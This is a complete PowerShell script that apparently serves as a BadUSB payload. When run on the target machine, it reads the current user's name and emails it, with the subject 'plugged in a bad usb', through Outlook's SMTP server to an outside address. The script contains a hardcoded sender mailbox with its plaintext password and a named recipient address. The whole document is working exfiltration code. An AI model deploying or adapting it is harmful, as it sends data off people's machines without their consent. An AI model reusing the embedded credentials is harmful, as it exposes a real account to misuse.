$email = "psnerdattack@outlook.com" 
$pass = "gSCR7MjO8H9w"
$smtpServer = "smtp-mail.outlook.com" 
$msg = new-object Net.Mail.MailMessage 
$smtp = new-object Net.Mail.SmtpClient($smtpServer) 
$smtp.EnableSsl = $true 
$msg.From = "$email"
$msg.To.Add("11182@elizabethcollege.gg") 
$msg.BodyEncoding = [system.Text.Encoding]::Unicode 
$msg.SubjectEncoding = [system.Text.Encoding]::Unicode 
$msg.IsBodyHTML = $true  
$msg.Subject = $env:UserName + " plugged in a bad usb" 
$msg.Body = "<h2>User " + $env:UserName + " plugged in a bad usb!</h2>"  
$smtp.Credentials = New-Object System.Net.NetworkCredential("$email", "$pass"); 
$smtp.Send($msg)